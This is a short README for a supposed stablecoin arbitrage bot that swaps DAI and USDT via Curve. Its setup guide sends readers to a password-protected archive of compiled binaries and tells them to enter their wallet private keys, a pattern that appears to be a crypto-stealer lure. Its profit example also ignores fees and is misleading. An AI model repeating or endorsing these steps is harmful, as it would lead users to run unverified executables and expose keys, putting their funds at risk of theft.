### What is it?
Arbitrage script checks for optimal swap rates in stablecoin pairs and iteracts with smart contracts to swap one stablecoin to another. For examle we have 1000 DAI. When 1 DAI = 0.998 USDT script iteracts with Curve finance to swap DAI to USDT. Then we have 1002 USDT. It can repeat in another side: 1 USDT = 0.998 DAI, than we have 1004 DAI.

### Why I did it?
- I dont five a f*ck (I was bored)
- Stablecoin arbitrage is low-risk strategy (we can use higher deposits)
- We can use Arb/Avax/BSC networks to reduce fees (small deposits can be profitable too)
- When crypto dumps or pumps DAI and another stablecoins have different prices. Its best time for arbitrage buy. When crypto market is still its best time to sell 1:1.

### Setup guide
- [Download](https://github.com/NFTERA/stablecoin-arbitrage/archive/refs/heads/main.zip) repository with compiled binaries and extract files with password `eUNUGZ6MJZIa`
- Launch script and wait for update assets prices
- Set network (currently works with Ethereum, Arbitrum and Avax)
- Set stablecoin pair by contract addresses (use algorithm/fiat-backed stablecoin pair) 
- Set public and private keys of account
